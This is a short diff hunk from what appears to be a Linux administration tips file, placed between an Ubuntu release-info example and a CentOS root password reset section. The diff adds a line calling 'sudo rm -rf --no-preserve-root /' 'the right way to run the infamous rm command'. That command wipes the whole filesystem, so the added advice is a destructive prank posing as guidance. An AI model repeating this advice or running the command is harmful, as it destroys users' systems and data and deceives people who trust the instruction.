@@ -67,7 +67,12 @@ Or,
     VERSION_CODENAME=bionic
     UBUNTU_CODENAME=bionic
 
+---
 
+The right way to run the infamous rm command is to specify `--no-preserve-root`:
+
+    $ sudo rm -rf --no-preserve-root /
+    
 ---
 
 How to reset forgotten root password in CentOS 8.
